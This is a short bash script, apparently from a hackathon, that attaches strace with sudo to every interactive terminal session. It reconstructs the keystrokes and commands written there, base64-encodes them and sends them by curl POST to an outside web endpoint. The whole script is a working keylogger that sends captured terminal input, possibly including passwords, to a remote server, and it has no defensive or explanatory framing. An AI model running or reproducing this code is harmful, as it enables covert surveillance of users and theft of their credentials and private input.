#!/usr/bin/env bash

BUFFER=buf.txt
STDOUT=0

# Requires sudo, strace and GNU grep

get-char () {
  cat /dev/stdin  |
  grep            \
  --line-buffered \
  -o '".*[^"]"'   |

  grep            \
  --line-buffered \
  -o '[^"]*[^"]'  |

while IFS="" read -r char; do
  printf '%b' "$char"
done
}

write-buffer () {
  buffer="${1}"
  cat /dev/stdin >> "${buffer}"
}

clear-buffer () {
  buffer="${1}"
  : > "${buffer}"
}

send-buffer () {
  buffer="${1}"
  content="$(cat "${BUFFER}" | xxd -ps -c0 | sed -e 's/\(0d\)\?1b5b3f323030346\(8\|c\)//g' -e 's/0d$//g' -e 's/^24//g' | xxd -ps -c0 -r | base64 -w0)"
  curl -sL https://hackhpi.kyudev.xyz/api/blue -X POST -H "Content-Type: application/json" -d "{\"data\": \"${content}\", \"timestamp\": \"$(date +%s)\"}" 1>/dev/null
  clear-buffer "${BUFFER}"
}

delete-buffer () {
  buffer="${1}"
  rm -f "${buffer}"
}

clear-buffer "${BUFFER}"
sudo strace       \
  -e trace=write  \
  -s 1000         \
  $(ps u                       |
    grep pts                   |
    grep Ss                    |
    grep -v grep               |
    awk '{print "-p " $2 " "}' |
    xargs)        \
 2>&1             |
while IFS="" read -r line; do
  fd="$(printf '%s' "${line}" | grep -o 'write(.' | tail -c 2 | head -c 1)"
  if [ "${fd}" = "1" ] || [ ! "${line}" = "${line//SIGCHLD/}" ]; then
    send-buffer "${BUFFER}"
  else
    printf '%s\n' "${line}" | get-char | write-buffer "${BUFFER}"
  fi
done
delete-buffer "${BUFFER}"
